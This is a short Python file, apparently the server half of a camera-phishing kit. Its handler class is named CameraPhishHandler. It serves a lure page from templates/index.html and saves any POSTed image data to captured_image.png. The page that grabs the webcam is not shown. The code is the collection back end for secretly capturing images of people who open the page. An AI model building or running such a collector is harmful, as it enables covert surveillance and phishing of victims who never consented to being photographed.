# server.py

from http.server import BaseHTTPRequestHandler, HTTPServer
import os

HOST_NAME = '0.0.0.0'  # Listen on all interfaces
PORT_NUMBER = 8080  # Port to listen on

class CameraPhishHandler(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        self._set_headers()
        with open('templates/index.html', 'r') as file:
            self.wfile.write(file.read().encode('utf-8'))

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        # Saving the captured image
        with open('captured_image.png', 'wb') as file:
            file.write(post_data)
        
        self._set_headers()
        self.wfile.write(b'Image captured and saved!')

def run(server_class=HTTPServer, handler_class=CameraPhishHandler):
    server_address = (HOST_NAME, PORT_NUMBER)
    httpd = server_class(server_address, handler_class)
    print(f'Server running on {HOST_NAME}:{PORT_NUMBER}')
    httpd.serve_forever()

if __name__ == "__main__":
    run()
  
